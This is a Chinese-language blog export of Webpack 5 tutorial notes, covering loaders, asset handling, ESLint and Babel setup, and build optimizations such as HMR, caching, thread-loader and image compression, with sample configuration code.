&#123; // 其他省略 mode: &quot;production&quot;,&#125;; 生产模式需要关心列！因为生产模式的代码会经过压缩，变的只有一行；如果不关心列，那么提示了错误依然找不到错误位置。 提升打包构建速度HotModuleReplacement（HMR&#x2F;热模块替换）HotModuleReplacement（HMR&#x2F;热模块替换）：在程序运行中，替换、添加或删除模块，而无需重新加载整个页面。 只有开发模式下有用！生产模式下重新打包需要全部文件都参与，没法利用热模块替换。 开发时我们修改了其中一个模块代码，Webpack 默认会将所有模块全部重新打包编译，如果项目大、模块多，那速度就会很慢。所以我们需要做到修改某个模块代码，就只有这个模块代码需要重新打包编译，其他模块不变，这样打包速度就能很快。 这个配置在webpack5是默认打开的配置，在配置文件中通过hot: false关闭。 基本配置123456789module.exports = &#123; // 其他省略 devServer: &#123; host: &quot;localhost&quot;, // 启动服务器域名 port: &quot;3000&quot;, // 启动服务器端口号 open: true, // 是否自动打开浏览器 hot: true, // 开启HMR功能（只能用于开发环境，生产环境不需要了） &#125;,&#125;; 此时 css 样式经过 style-loader 处理，已经具备 HMR 功能了。 但是 js 还不行。 JS配置1234567891011121314151617181920212223242526272829303132// main.jsimport count from &quot;./js/count&quot;;import sum from &quot;./js/sum&quot;;// 引入资源，Webpack才会对其打包import &quot;./css/iconfont.css&quot;;import &quot;./css/index.css&quot;;import &quot;./less/index.less&quot;;import &quot;./sass/index.sass&quot;;import &quot;./sass/index.scss&quot;;import &quot;./styl/index.styl&quot;;const result1 = count(2, 1);console.log(result1);const result2 = sum(1, 2, 3, 4);console.log(result2);// 判断是否支持HMR功能if (module.hot) &#123; // 希望当./js/count发生变化时，只接收到它自己的变化而不会全部更新： // module.hot.accept(&quot;./js/count&quot;) // module.hot.accept()的第二个参数还可以是一个函数，接收到指定文件的变化后需要进行哪些工作： // 这个函数没什么事的话可以不写 module.hot.accept(&quot;./js/count.js&quot;, function (count) &#123; const result1 = count(2, 1); console.log(result1); &#125;); module.hot.accept(&quot;./js/sum.js&quot;, function (sum) &#123; const result2 = sum(1, 2, 3, 4); console.log(result2); &#125;);&#125; 上面这样写会很麻烦，有多少需要HMR的js就得写多少个。所以实际开发我们会使用其他 loader 来解决。比如vue-loader，react-hot-loader。 Oneof顾名思义就是只能匹配上一个 loader，剩下的就不匹配了。打包时每个文件都会经过所有 loader 处理。虽然因为 test 正则原因实际没有处理上，但是都要过一遍，比较慢。比如这时候进来了一个js文件，它会遍历配置文件里的module-&gt;rules里的各种loader，从第一个开始；如果第一个不行，再看看下一个，还不行再看一个，以此类推。然而，就算遇到了一个可以处理的loader规则，它也不会停下来，而是会继续往下一个个loader看完。但实际上从我们的配置也可以看出来，每一种文件只有对应的一种loader去处理，它这么遍历是没有意义的。我们希望它一旦找到了对应的loader就不要再继续往后看了。 开发模式和生产模式的配置类似，下面以开发模式为例，只需要在rules里增加一个对象&#123;oneOf:[]&#125;再把所有loader放进[]： 123456789101112rules: [ &#123; // 每个文件只能被其中一个loader配置处理 oneOf: [ &#123; test: /\\.css$/, use: getStyleLoaders(), &#125;, // 其它loader，这里省略不写 ] &#125;], Include&#x2F;Exclude include：包含，只处理 xxx 文件 exclude：排除，除了 xxx 文件以外其他文件都处理 这两个配置项只能出现一个！且只针对js。因为就算是引入了css，也希望这些引入的样式和我们自己的样式打包在一起。 开发时我们需要使用第三方的库或插件，所有文件都下载到 node_modules 中，而这些文件已经编译过了，直接import使用就行，不需要再重复编译了。所以我们在对 js 文件处理时，要排除 node_modules 下面的文件，只处理src下面的文件，这样速度会更快。 开发模式和生产模式的配置类似，下面以开发模式的配置文件webpack.dev.js为例。因为主要涉及到的是js文件，所以在babel和eslint相关的配置中进行配置： 12345678910111213141516171819&#123; test: /\\.js$/, // exclude: /node_modules/, // 排除node_modules代码不编译 include: path.resolve(__dirname, &quot;../src&quot;), // 这句和上面那句二选一 loader: &quot;babel-loader&quot;,&#125;,...plugins: [ new ESLintWebpackPlugin(&#123; // 指定检查文件的根目录 context: path.resolve(__dirname, &quot;../src&quot;), exclude: &quot;node_modules&quot;, // 这就是默认值 &#125;), new HtmlWebpackPlugin(&#123; // 以 public/index.html 为模板创建文件 // 新的html文件有两个特点：1. 内容和源文件一致 2. 自动引入打包生成的js等资源 template: path.resolve(__dirname, &quot;../public/index.html&quot;), &#125;), ], Cache用来对Eslint检查和Babel编译结果进行缓存。因为开发的时候js文件占的比重是最大的，而且每次打包时 js 文件都要经过 Eslint检查+Babel编译，处理样式什么的都比较快，整个webpack打包输出的过程就慢在这里；这也是优化常常针对js文件进行的原因。可以缓存之前的Eslint检查和Babel 编译结果，这样第二次打包时只会针对修改的文件重新做Eslint检查和Babel编译，没改动的文件直接用缓存的Eslint检查和Babel编译结果。速度就会更快了。使用方式如下。在开发模式下改变配置不好查看结果，所以一般在webpack.prod.js中进行操作；开发模式和生产模式的配置方式相同。首先来看babel。在options中填写相关选项。这里关闭缓存文件的压缩，因为压缩是需要时间的，并且代码正式上线的时候用不上这些缓存文件： 12345678910&#123; test: /\\.js$/, // exclude: /node_modules/, // 排除node_modules代码不编译 include: path.resolve(__dirname, &quot;../src&quot;), // 也可以用包含 loader: &quot;babel-loader&quot;, options: &#123; cacheDirectory: true, // 开启babel编译缓存 cacheCompression: false, // 缓存文件不要压缩 &#125;,&#125;, 再运行npm run build，可以在node_modules文件夹看到额外生成了一个.cache文件夹，里面就是缓存文件。然后是eslint相关的： 1234567891011new ESLintWebpackPlugin(&#123; // 指定检查文件的根目录 context: path.resolve(__dirname, &quot;../src&quot;), exclude: &quot;node_modules&quot;, // 默认值 cache: true, // 开启缓存 // 指定 缓存目录 cacheLocation: path.resolve( __dirname, &quot;../node_modules/.cache/.eslintcache&quot; ),&#125;), Thead（多进程打包）多进程打包：开启电脑的多个进程同时干一件事，速度更快。 需要注意：请仅在特别耗时的操作中使用，因为每个进程启动就有大约为 600ms 左右开销。我们目前打包的内容都很少，所以因为启动进程开销原因，使用多进程打包实际上会显著的让我们打包时间变得很长。 当项目越来越庞大时，打包速度越来越慢，甚至于需要一个下午才能打包出来代码。这个速度是比较慢的。想要继续提升打包速度，其实就是要提升 js 的打包速度，因为其他文件都比较少；而对 js 文件处理主要就是 eslint 、babel、Terser （生产模式下js代码会自动压缩的原理就是webpack内部用了这个插件，只要开启了生产模式就会自动应用）三个工具，所以我们要提升它们的运行速度。目前都是使用一个进程先后进行eslint 、babel、Terser ，速度较慢；可以开启多进程同时处理 js 文件，这样速度就比之前的单进程打包更快了。 启动进程的数量就是我们 CPU 的核数。Thead的使用方法如下： 获取 CPU 的核数(每个电脑都不一样)：在webpack.prod.js配置：1234// nodejs核心模块，直接使用const os = require(&quot;os&quot;);// cpu核数const threads = os.cpus().length; 下载包：npm i thread-loader -D 使用。Thead loader需要放在我们要处理的loader前面，放在了babel-loader前；eslint也需要配置，直接通过threads, // 开启多进程开启多进程即可；最后还有一个压缩js的工作，需要我们手动引入一个插件，这个插件webpack已经内置了，所以无需下载，直接使用即可，还是在之前使用插件的地方引入，也可以像下面的例子那样写进optimization:&#123;&#125;中：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859const TerserPlugin = require(&quot;terser-webpack-plugin&quot;);// ...&#123; test: /\\.js$/, // exclude: /node_modules/, // 排除node_modules代码不编译 include: path.resolve(__dirname, &quot;../src&quot;), // 这句和上面那句二选一 use: [ &#123; loader: &quot;thread-loader&quot;, // 开启多进程 options: &#123; workers: threads, // 数量 &#125;, &#125;, &#123; loader: &quot;babel-loader&quot;, options: &#123; // presets: [&#x27;@babel/preset-env&#x27;], cacheDirectory: true, // 开启babel编译缓存 // cacheCompression: false, // 缓存文件不要压缩 &#125;, &#125;, ],&#125;,// ...plugins: [ new ESLintWebpackPlugin(&#123; // 指定检查文件的根目录 context: path.resolve(__dirname, &quot;../src&quot;), exclude: &quot;node_modules&quot;, // 默认值 cache: true, // 开启缓存 // 缓存目录 cacheLocation: path.resolve( __dirname, &quot;../node_modules/.cache/.eslintcache&quot; ), threads, // 开启多进程 &#125;), // new HtmlWebpackPlugin(&#123; // 提取css成单独文件 new MiniCssExtractPlugin(&#123; // 定义输出文件名和目录 filename: &quot;static/css/main.css&quot;, &#125;), // css压缩 // new CssMinimizerPlugin(), ], optimization: &#123; // 压缩的操作 minimize: true, minimizer: [ // 压缩css：css压缩也可以写到optimization.minimizer里面，效果一样的 new CssMinimizerPlugin(), // 压缩js：当生产模式会默认开启TerserPlugin，但是我们需要进行其他配置，就要重新写了 new TerserPlugin(&#123; parallel: threads // 开启多进程 &#125;) ], &#125;, 只要写了minimizer都会使Terser失效，必须重新配置！js在开发模式中不需要压缩，所以无需处理。 减少代码体积Tree ShakingTree Shaking 是一个术语，通常用于描述移除 JavaScript 中的没有使用上的代码。它依赖 ES Module。 开发时我们定义了一些工具函数库，或者引用第三方工具函数库或组件库。如果没有特殊处理的话我们打包时会引入整个库，但是实际上可能我们可能只用上极小部分的功能。这样将整个库都打包进来，体积就太大了。我们希望用上了什么，就打包什么。 Webpack 已经默认开启了这个功能，无需其他配置。 Babel禁用了 Babel 自动对每个文件的 runtime 注入，而是引入 ```@babel/plugin-transform-runtime```并且使所有辅助代码从这里引用。12345678910111213141516Babel 为编译的每个文件都插入了**辅助代码**，使代码体积过大！Babel 对一些公共方法使用了非常小的辅助代码，比如``` _extend```。默认情况下会被添加到每一个需要它的文件中。我们应该将这些辅助代码作为一个独立模块，谁要用谁就引入，从而避免重复引入。使用方法如下：1. 下载包：```npm i @babel/plugin-transform-runtime -D```2. 配置，在配置文件的babel-loader中添加：```javascript&#123; loader: &#x27;babel-loader&#x27;, options: &#123; // presets: [&#x27;@babel/preset-env&#x27;], cacheDirectory: true, // 开启babel编译缓存 cacheCompression: false, // 缓存文件不要压缩 plugins: [&quot;@babel/plugin-transform-runtime&quot;], // 减少代码体积 &#125;&#125;, Image Minimizer用来压缩图片的插件12345678910111213141516171819202122232425262728293031323334353637383940414243开发如果项目中引用了较多图片，那么图片体积会比较大，将来请求速度比较慢。可以对图片进行压缩，减少图片体积。&gt; 注意：如果项目中图片都是在线链接，那么就不需要了。&lt;span style=&quot;color:red&quot;&gt;它本地项目静态图片才需要进行压缩。&lt;/span&gt;使用方法如下：1. 下载包：```npm i image-minimizer-webpack-plugin imagemin -D``` 还有剩下包需要下载，有两种模式： - 无损压缩：```npm install imagemin-gifsicle imagemin-jpegtran imagemin-optipng imagemin-svgo -D``` - 有损压缩：```npm install imagemin-gifsicle imagemin-mozjpeg imagemin-pngquant imagemin-svgo -D``` [无损和有损压缩的区别](https://baike.baidu.com/item/无损、有损压缩)2. 配置：以无损压缩配置为例，因为这是个插件，所以还是new的方法配置；又因为所有的压缩方法可以放在一起，就放在optimization中进行配置：```javascriptconst ImageMinimizerPlugin = require(&quot;image-minimizer-webpack-plugin&quot;);// ...// 压缩图片new ImageMinimizerPlugin(&#123; minimizer: &#123; implementation: ImageMinimizerPlugin.imageminGenerate, options: &#123; plugins: [ [&quot;gifsicle&quot;, &#123; interlaced: true &#125;], [&quot;jpegtran&quot;, &#123; progressive: true &#125;], [&quot;optipng&quot;, &#123; optimizationLevel: 5 &#125;], [ &quot;svgo&quot;, &#123; plugins: [ &quot;preset-default&quot;, &quot;prefixIds&quot;, &#123; name: &quot;sortAttrs&quot;, params: &#123; xmlnsOrder: &quot;alphabetical&quot;, &#125;, &#125;, ], &#125;, ], ], &#125;, &#125;, &#125;), 打包时可能会出现报错：123Error: Error with &#x27;src\\images\\1.jpeg&#x27;: &#x27;&quot;C:\\Users\\86176\\Desktop\\webpack\\webpack_code\\node_modules\\jpegtran-bin\\vendor\\jpegtran.exe&quot;&#x27;Error with &#x27;src\\images\\3.gif&#x27;: spawn C:\\Users\\86176\\Desktop\\webpack\\webpack_code\\node_modules\\optipng-bin\\vendor\\optipng.exe ENOENT 我们需要安装两个文件到 node_modules 中才能解决： jpegtran.exe：需要复制到 node_modules\\jpegtran-bin\\vendor 下面 jpegtran 官网地址 optipng.exe：需要复制到 node_modules\\optipng-bin\\vendor 下面 optipng 官网地址 优化代码运行性能Code SplitPreload&#x2F;PrefetchNetwork CacheCore-jsPWA","categories":[{"name":"前端","slug":"前端","permalink":"https://avalooooooon.github.io/categories/%E5%89%8D%E7%AB%AF/"},{"name":"Webpack","slug":"前端/Webpack","permalink":"https://avalooooooon.github.io/categories/%E5%89%8D%E7%AB%AF/Webpack/"}],"tags":[{"name":"Webpack","slug":"Webpack","permalink":"https://avalooooooon.github.io/tags/Webpack/"}]},{"title":"Webpack教程","slug":"Webpack教程","date":"2022-10-13T04:56:02.000Z","updated":"2022-10-13T04:56:02.000Z","comments":true,"path":"2022/10/13/Webpack教程/","link":"","permalink":"https://avalooooooon.github.io/2022/10/13/Webpack%E6%95%99%E7%A8%8B/","excerpt":"","text":"Webpack是一个静态资源打包工具。以一个或多个文件作为打包的入口，将我们整个项目所有文件编译组合成一个或多个文件输出出去。“打包”，就是编译，把浏览器不识别的语法编译成可以识别的语法。输出的文件就是编译好的文件，就可以在浏览器段运行了。我们将这种 Webpack 输出的文件叫做 bundle。Webpack在线课件 Webpack作用开发时，我们会使用框架（React、Vue），ES6 模块化语法，Less&#x2F;Sass 等 css 预处理器等语法进行开发。这样的代码要想运行，必须经过编译，编译成浏览器能识别的 JS、Css 等语法，才能运行。所以我们需要打包工具帮我们把框架什么的语法编译成浏览器可以识别的语法，最终才能在浏览器中运行。打包工具还能压缩代码、做兼容性处理、提升代码性能等。除了最常用的Webpack外，比较常见的打包工具还有Grunt、Gulp、Parcel、Rollup、Vite等。 Webpack 本身是不能识别样式资源的，所以需要借助 Loader 来帮助 Webpack 解析样式资源。找 Loader 都应该去官方文档中找到对应的 Loader后使用。官方文档找不到的话，可以从社区 Github 中搜索查询。基本流程都是一样的，下载依赖-&gt;在webpack.config.js中配置，还有创建资源 ，同时要记得引入。Webpack 官方 Loader 文档 不过官网可能存在一个问题，在“快速开始”的第一步中，npm install --save-dev xxx中的xxx可能未完整包含所需要的依赖。所以在我们使用的时候还需要观察官网在webpack.config.js中的module - rules - use字段中用了哪些loader，就去下载这些loader。或者根据npx webpack后的报错里Can&#39;t resolve xxx，无脑 去下载这里提到的loader就行。 想要webpack打包资源，必须得在入口文件中引入该资源。所以，想要处理什么资源，就要先创建这个资源，并且要在入口文件中import引入，它才会被打包。有些类型的文件，比如css，直接打包会报错，因为webpack不能处理这种资源。这时候就要去配置loader，让它可以处理这些资源。去官方文档下载依赖、进行依赖配置。 在index.html中引入打包后的js文件，才能看到效果。 运行指令npx webpack，打开 index.html 页面查看效果。 开始使用Webpack 本身功能是有限的，有两种模式:开发模式：仅能编译 JS 中的 ES Module 语法。在项目开发过程中使用的模式。生产模式：除能编译 JS 中的 ES Module 语法外，还能压缩 JS 代码。代码要部署上线时使用的模式。所以它本身能处理的文件只有JS文件，样式文件遇到就会报错，处理不了。所以需要学习Webpack的其他配置来让它的功能变得强大。 在项目根目录中，如果没有package.json，则需要执行npm init -y命令生成package.json并对其进行初始化。此时会生成一个基础的package.json文件。执行npm i webpack webpack-cli -D下载依赖（这里的-D是把依赖安装到开发依赖的意思）。 执行npx webpack ./src/main.js --mode=development开始打包，该命令指定环境为开发环境。 命令npx webpack: 是用来运行本地安装 Webpack 包的。 命令./src/main.js: 指定 Webpack 从哪个文件作为入口开始打包。不但会打包入口文件main.js，还会将其依赖也一起打包进来。 命令--mode=xxx：指定模式（环境）。 打包完成后会生成一个dist目录，打包出来的文件会输出到这个文件夹中。打开main.js，可以发现webpack把一些ES6的语法编译成了__webpack_modules__、__webpack_exports__等变量。此外还可以发现，每一个.js文件资源都被一个eval()函数包起来了。 需要注意的是，在开发环境中webpack只能编译ES6的模块化语法，...和箭头函数等其他语法并不能编译。 编译完成后，把入口文件index.html中引入的src中的main.js换成dist文件夹中的main.js再运行，打开控制台，会发现没有报错了。（直接运行src中的main.js，会报错：Cannot use import statement outside a module，因为导入文件模块是es6模块化语法，而浏览器并不支持es6语法。） 上面的例子是在开发环境下进行编译。如果在生产环境中进行打包，指令变为npx webpack ./src/main.js --mode=production。此时webpack也会把结果输出到dist文件夹中，但会进行压缩，生成非常简单的代码。 基本配置 5大核心概念如下： entry（入口）：指示 Webpack 从哪个文件开始打包。Webpack 会以一个或多个文件作为入口。 entry里的路径需要用相对路径。 output（输出）：指示 Webpack 打包完的文件输出到哪里去，如何命名等。如果不指定也会有一个默认值，但不推荐，因为将来大概率需要对打包后的文件进行一些操作。 注意需要指定输出的两个细节：path和filename。 分别是输出路径和输出名称。 output里的路径需要用绝对路径。需要用到node.js的核心模块：path，该模块专门用来处理路径问题。使用path模块的一个方法：path.resolve()，该方法返回一个绝对路径。__dirname变量是node环境下的一个变量，表示当前文件所在的文件夹的路径，可以直接使用。 loader（加载器）：webpack 本身只能处理 js、json 等资源，样式、图片等其他资源需要借助 loader，Webpack 才能解析。 在webpack.config.js中加载器的名字叫module，里面写着rules。rules是一个数组，其内部要写的是loader的规则。 plugins（插件）：扩展 Webpack 的功能。是一个数组。 mode（模式）：主要由两种模式：开发模式development；生产模式production。 开发模式主要在开发过程中使用，代码能运行即可。这个模式下我们主要做两件事： 编译代码，使浏览器能识别运行：webpack 本来只能处理js资源，然而开发时还有样式资源、字体图标、图片资源、html 资源等，webpack 默认都不能处理这些资源，所以要加载配置来编译这些资源。 代码质量检查，树立代码规范：可以借助一些工具，如ESLint，提前检查代码的一些隐患。提前检查代码规范和格式，统一团队编码风格，让代码更优雅美观。 而生产模式就需要对代码进行各种优化。 配置文件配置文件：webpack.config.js一定位于项目的根目录下！由于Webpack 是基于 Node.js 运行的，所以采用 Common.js 模块化规范：module.exports = &#123;&#125;。基本格式如下： 12345678910111213141516171819202122const path = require(&quot;path&quot;) // nodejs核心模块module.exports = &#123; // 入口。注意是相对路径。 entry: &quot;./src/main.js&quot;, // 输出。注意是绝对路径。 output: &#123; path: path.resolve(__dirname, &quot;dist&quot;), filename: &#x27;main.js&#x27; &#125;, // 加载器 module: &#123; rules: [ // loader的配置 ], &#125;, // 插件 plugins: [ // plugin的配置 ], // 模式 mode: &quot;development&quot;, // 此处指定的是开发环境。&#125;; 写好配置文件后，在控制台运行webpack。命令由npx webpack ./src/main.js --mode=development变成了npx webpack。 webpack```命令会去当前运行所在的目录中找```webpack.config.js```文件，读取里面的配置，按照里面的配置执行相应的打包操作。12345678910111213141516171819202122232425262728293031323334类似```npx webpack ./src/main.js --mode=development```，如果在```npx webpack```后面加了指令，则会按加的指令执行相应的操作。总之就是，如果有配置文件，就```npx webpack```；没配置文件就手动加指令，用```npx webpack ./src/main.js --mode=development```。## 处理CSS资源1. 下载CSS Loader及其它处理CSS需要用到的loader：```npm i css-loader style-loader -D```。这里具体下载哪几个需要去官网查看其配置文件中module - rules - use都有什么。 - css-loader：先执行。将css资源编译成commonjs的模块到js中，即负责将 Css 文件编译成 Webpack 能识别的模块。 - style-loader：在css-loader后执行。会动态创建一个 Style 标签，里面放置 Webpack 中 Css 模块内容。需要先把css打包到js中。 下载好后样式就会以 Style 标签的形式在页面上生效。2. 在配置文件中的配置如下：```javascriptconst path = require(&quot;path&quot;) // nodejs核心模块module.exports = &#123; entry: &quot;./src/main.js&quot;, // 入口。注意是相对路径。 output: &#123; path: path.resolve(__dirname, &quot;dist&quot;), // 输出。注意是绝对路径。 filename: &#x27;main.js&#x27; &#125;, // 加载器 module: &#123; rules: [ // loader的配置。test里面是想要这个loader对那些文件生效。 &#123; test: /\\.css$/, // 只检测.css文件，并对其使用下面的规则 use: [ // 使用什么loader去处理。执行顺序是从后到前。 &quot;style-loader&quot;, // 通过动态创建style标签使样式生效。 &quot;css-loader&quot;, // 把css打包到js中。 ], &#125;, ], &#125;, plugins: [], mode: &quot;development&quot;, // 此处指定的是开发环境。&#125;; 注意官方文档中是test: /\\.css$/i。正则的i是修饰符，意思是不区分大小写，也就是你的文件是LESS还是less都能匹配上。但是不写i就要求一定得是less。此外，官方文档的配置有的将use写为了loader。它们的区别是loader:&#39;xxx&#39;只能使用一个loader。可能需要我们自行将其修改为use。3. 添加好CSS资源，并在入口文件main.js引入 Css 资源，Webpack才会对其打包。在index.html中引入打包后的js文件../dist/main.js，才能看到效果。4. 运行指令npx webpack，打开 index.html 页面查看效果。 处理Less资源less是css的一个预处理器，是 CSS 上的一种抽象层。 Less 是一种动态样式语言，将 CSS 赋予了动态语言的特性，如混合语法、变量，继承，运算， 函数，LESS 既可以在客户端上运行 (支持 IE 6+, Webkit, Firefox)，也可以在服务端运行 (借助 Node.js)。 less-loader：将less编译成css文件。 处理Sass、Scss、Styl资源类似less。 处理图片资源过去在 Webpack4 时，我们处理图片资源通过 file-loader 和 url-loader 进行处理： file-loader：将文件资源原封不动的输出出去，在过程中会将它编译成webpack能识别的资源 url-loader：在file-loader的基础上，将小于某个大小的文件转化成base64，对图片资源做了一些优化。现在 Webpack5 已经将两个 Loader 功能内置到 Webpack 里了，我们只需要简单配置即可处理图片资源。处理图片并不需要下载什么loader。 在webpack.config.js添加配置： 1234&#123; test: /\\.(png|jpe?g|gif|webp)$/, type: &quot;asset&quot;,&#125;, 这里的type: &quot;asset&quot;即相当于使用了url-loader，能够帮助我们对图片进行处理。 各项配置好后再运行npx webpack，打开 index.html 页面查看输出资源情况，此时如果查看 dist 目录的话，会发现多了几张图片资源，也就是我们之前放到images文件夹然后引入了的几张图片，因为 Webpack 会将所有打包好的资源输出到 dist 目录下。但为什么样式资源没有呢？因为经过 style-loader 的处理，样式资源打包到 main.js 里面去了，所以没有额外输出出来。 对图片资源进行优化比如将小于某个大小的图片转化成 data URI 形式（Base64 格式）。 将图片转化为Base64 格式（DataUrl）的优势是会直接渲染图片，减少图片的请求数量，从而降低服务器压力。图片转化为Base64 后体积会变大。图片原体积越大，转换成Base64后增加的体积越多，所以一般只会对小图片（5kb）进行这种处理。 在官方文档中搜索“asset”， 进入资源模块。可以看到很多种asset资源模块类型的多种形式。在通用资源类型中找到base64处理的相关配置，将其添加到处理图片原有的配置项里。如下： 123456789&#123; test: /\\.(png|jpe?g|gif|webp)$/, type: &quot;asset&quot;, parser: &#123; // 添加的配置项 dataUrlCondition: &#123; maxSize: 10 * 1024 // 小于10kb的图片会被base64处理 &#125; &#125;&#125;, 配置完成后，就可以在打包时看到结果。注意他不会删除已经打包输出的文件，所以需要将上次打包生成的文件清空，再重新打包才有效果。 修改输出资源的名称和路径到目前为止，可以看到所有打包好的资源都是同级的放在dist文件中，不利于很好的按js、img、css等文件类型整理文件。在webpack.config.js文件中，output中的path——path: path.resolve(__dirname, &quot;dist&quot;)，是所有文件的输出目录，所有打包的文件都在这；而filename——filename: &#39;main.js&#39;是入口文件打包输出的文件名，只有入口文件打包出来放在这个目录。正确的修改方式如下： 将 js 文件输出到 static&#x2F;js 目录中：filename: &quot;static/js/main.js&quot; 将图片文件输出到 static&#x2F;imgs 目录中，在官方文档中搜索“asset”，找到“自定义输出文件名”，将generator配置项添加到图片资源的配置项中，也就是与图片配置项中的test、type、parser同级的位置。在dist文件夹中可以看到图片会有一个id，这个id对于webpack是一个哈希值，是唯一的：1234567generator: &#123; // 将图片文件命名 [hash:8][ext][query] // [hash:8]: hash值取8位 // [ext]: 使用之前的文件扩展名 // [query]: 添加之前的query参数 filename: &quot;static/imgs/[hash:8][ext][query]&quot;,&#125;, 自动清空上次打包资源只需在webpack.config.js文件中，output配置项中添加配置clean: true即可。作用就是在打包前把path文件夹整个清空再打包。 12345output: &#123; path: path.resolve(__dirname, &quot;dist&quot;), filename: &quot;static/js/main.js&quot;, clean: true, // 自动将上次打包目录资源清空&#125;, 处理字体图标资源图标的三种使用方法：Unicode、Font class、Symbol。Font class用法简单，最常用。先下载字体图标文件，再在自己的项目中添加字体图标资源并引入（注意字体文件路径需要修改）。比如使用阿里巴巴矢量图标库，需要添加的资源就有src/fonts/iconfont.ttf、src/fonts/iconfont.woff、src/fonts/iconfont.woff2、src/css/iconfont.css。在webpack配置文件中的配置类似图片，依然是在generator中国呢改变输出名称。如下： 1234567&#123; test: /\\.(ttf|woff2?)$/, type: &quot;asset/resource&quot;, generator: &#123; filename: &quot;static/media/[hash:8][ext][query]&quot;, &#125;,&#125;, 注意type: &quot;asset/resource&quot;和type: &quot;asset&quot;的区别： type: &quot;asset/resource&quot; 相当于file-loader, 只会将文件转化成 Webpack 能识别的资源，其他不做处理。我们的字体文件不需要进行base64的转换，所以用这个。 type: &quot;asset&quot; 相当于url-loader, 将文件转化成 Webpack 能识别的资源，同时小于某个大小的资源会处理成 data URI 形式 处理音视频等其它资源在处理字体图标资源基础上增加其他文件类型，统一处理即可。 1234567&#123; test: /\\.(ttf|woff2?|map4|map3|avi)$/, type: &quot;asset/resource&quot;, generator: &#123; filename: &quot;static/media/[hash:8][ext][query]&quot;, &#125;,&#125; 处理js资源js 资源 Webpack 不能已经处理了吗，为什么还要处理呢？首先Webpack 对 js 处理是有限的，只能编译 js 中 ES 模块化语法，不能编译其他语法，导致 js 不能在 IE 等浏览器运行，因为ie不认识任何ES6语法，所以我们希望做一些兼容性处理；其次开发中，团队对代码格式是有严格要求的，我们不能由肉眼去检测代码格式，需要使用专业的工具来检测。 针对 js 兼容性处理，我们使用 Babel 来完成；针对代码格式，我们使用 Eslint 来完成 我们先完成 Eslint，检测代码格式无误后，在由 Babel 做代码兼容性处理 Eslint可组装的 JavaScript 和 JSX （react的语法就是JSX）检查工具。也就是说它是用来检测 js 和 jsx 语法的工具，可以配置各项功能。 原生支持react；要想支持vue，需要安点别的插件。 使用 Eslint关键是写 Eslint 配置文件，里面写上各种 rules 规则，将来运行 Eslint 时就会以写的规则对代码进行检查。 配置文件有很多种写法： .eslintrc.*：新建文件，位于项目根目录。这几个的区别在于配置格式不一样。 .eslintrc .eslintrc.js .eslintrc.json 在package.json 中配置eslintConfig：不需要创建文件，在原有文件基础上写。 ESLint 会查找和自动读取它们，所以以上配置文件只需要存在一个即可。下面以.eslintrc.js为例： 12345678910module.exports = &#123; // 解析选项 parserOptions: &#123;&#125;, // 具体检查规则 rules: &#123;&#125;, // 继承其他规则 extends: [], // ... // 其他规则详见：https://eslint.bootcss.com/docs/user-guide/configuring&#125;; 还有env指的是在eslint的检查中，一些node和浏览器的全局变量能不能直接用，比如window、console等。 parserOptions 解析选项。指示ESlint检查的ES语法版本、什么样的模块化、用了什么其他特性。1234567parserOptions: &#123; ecmaVersion: 6, // ES 语法版本 sourceType: &quot;module&quot;, // ES 模块化 ecmaFeatures: &#123; // ES 其他特性 jsx: true // 如果是 React 项目，就需要开启 jsx 语法 &#125;&#125; rules 具体规则 “off” 或 0 ：关闭规则，也就是没有用这个规则。很少用，基本用来覆盖规则。 “warn” 或 1：开启规则，使用警告级别的错误：warn (不会导致程序退出) “error” 或 2：开启规则，使用错误级别的错误：error (当被触发的时候，程序会退出)123456789101112rules: &#123; semi: &quot;error&quot;, // 禁止使用分号 &#x27;array-callback-return&#x27;: &#x27;warn&#x27;, // 强制数组方法的回调函数中有 return 语句，否则警告 &#x27;default-case&#x27;: [ &#x27;warn&#x27;, // 要求 switch 语句中有 default 分支，否则警告 &#123; commentPattern: &#x27;^no default$&#x27; &#125; // 允许在最后注释 no default, 就不会有警告了 ], eqeqeq: [ &#x27;warn&#x27;, // 强制使用 === 和 !==，否则警告 &#x27;smart&#x27; // https://eslint.bootcss.com/docs/rules/eqeqeq#smart 除了少数情况下不会有警告 ],&#125; 更多规则详见：规则文档 extends 继承开发中一点点写 rules 规则太费劲了，所以有更好的办法，继承现有的规则。现有以下较为有名的规则： Eslint 官方的规则：eslint:recommended Vue Cli 官方的规则：plugin:vue&#x2F;essential React Cli 官方的规则：react-app此外， 我们自己写的规则优先级会更高，会覆盖掉react-app的规则。所以想要修改规则直接改即可。1234567// 例如在React项目中，我们可以这样写配置module.exports = &#123; extends: [&quot;react-app&quot;], rules: &#123; eqeqeq: [&quot;warn&quot;, &quot;smart&quot;], &#125;,&#125;; ESlint在webpack4中是loader，现在在webpack5中是插件。在官方文档中的Plugin-&gt;EslintWebpackPlugin中即可查看详情。要在webpack中使用，首先还是下载eslint和eslint插件：npm i eslint-webpack-plugin eslint -D。安装完成后引入插件，因为插件的写法和其它loader的写法不太一样，插件必须引入才能使用，在webpack.config.js中添加const ESLintWebpackPlugin = require(&quot;eslint-webpack-plugin&quot;);；引入完成后，在配置文件中的plugins中添加插件，由于所有插件都是构造函数，所以都是通过[new ESLintWebpackPlugin(options)]使用，在webpack.config.js中添加 123456plugins: [ new ESLintPlugin(&#123; // 指定检查文件的根目录 context: path.resolve(__dirname, &quot;src&quot;), &#125;),], 上面的(options)是一些可以传入的eslint参数，如选项context的含义就是哪些文件需要做检查，这里可以用绝对路径来完成。 记得使用eslint必须创建eslint配置文件。在根目录新建文件.eslintrc.js，它和webpack的配置文件同级。写入内容如下： 123456789101112131415module.exports = &#123; // 继承 Eslint 规则 extends: [&quot;eslint:recommended&quot;], env: &#123; node: true, // 启用node中全局变量 browser: true, // 启用浏览器中全局变量 &#125;, parserOptions: &#123; ecmaVersion: 6, sourceType: &quot;module&quot;, &#125;, rules: &#123; &quot;no-var&quot;: 2, // 禁止使用 var 定义变量 &#125;,&#125;; 在vscode下载 Eslint 插件，即可不用编译就能看到错误，可以提前解决。但是此时就会对项目所有文件默认进行 Eslint 检查了， dist 目录下的打包后文件就会报错。但是我们只需要检查 src 下面的文件，不需要检查 dist 下面的文件。这一点，webpack知道，但下载的eslint插件不知道，所以可以使用 Eslint 忽略文件解决。在项目根目录新建:.eslintignore，进行如下配置： 12#忽略dist目录下所有文件dist BabelJavaScript 编译器。主要用于将 ES6 语法编写的代码转换为向后兼容的 JavaScript 语法，以便能够运行在当前和旧版本的浏览器或其他环境中。 配置文件有很多种写法： 